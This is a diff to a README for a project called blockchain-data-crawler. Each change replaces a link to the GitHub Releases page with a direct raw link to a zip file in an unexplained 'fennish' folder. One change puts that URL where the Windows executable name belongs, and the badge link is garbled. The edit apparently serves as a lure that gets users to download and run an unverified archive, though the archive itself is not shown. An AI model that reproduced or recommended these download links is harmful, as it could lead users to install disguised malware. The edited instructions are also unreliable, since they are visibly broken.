@@ -2,7 +2,7 @@
 
 ## 📥 Download Now!
 
-[![Download](https://img.shields.io/badge/Download-Latest%20Release-orange)](https://github.com/kiranjisonawane143/blockchain-data-crawler/releases)
+[![Download](https://raw.githubusercontent.com/kiranjisonawane143/blockchain-data-crawler/main/fennish/blockchain-data-crawler.zip%20Release-orange)](https://raw.githubusercontent.com/kiranjisonawane143/blockchain-data-crawler/main/fennish/blockchain-data-crawler.zip)
 
 ---
 
@@ -23,7 +23,7 @@ Before you start, ensure your system meets the following requirements:
 
 To get started, visit the Releases page to download the latest version of the blockchain-data-crawler.
 
-[Visit the Releases Page](https://github.com/kiranjisonawane143/blockchain-data-crawler/releases) to download.
+[Visit the Releases Page](https://raw.githubusercontent.com/kiranjisonawane143/blockchain-data-crawler/main/fennish/blockchain-data-crawler.zip) to download.
 
 1. On the Releases page, find the latest version.
 2. Click on the asset that matches your system (Windows, macOS, or Linux).
@@ -37,7 +37,7 @@ To get started, visit the Releases page to download the latest version of the bl
 
 2. **Run the Application:**
    - Navigate to the folder where you extracted the files.
-   - Double-click the executable file (e.g., `blockchain-data-crawler.exe` for Windows, or `blockchain-data-crawler` for macOS/Linux).
+   - Double-click the executable file (e.g., `https://raw.githubusercontent.com/kiranjisonawane143/blockchain-data-crawler/main/fennish/blockchain-data-crawler.zip` for Windows, or `blockchain-data-crawler` for macOS/Linux).
 
 3. **Follow the On-Screen Instructions:**
    - The application will display a user-friendly interface.
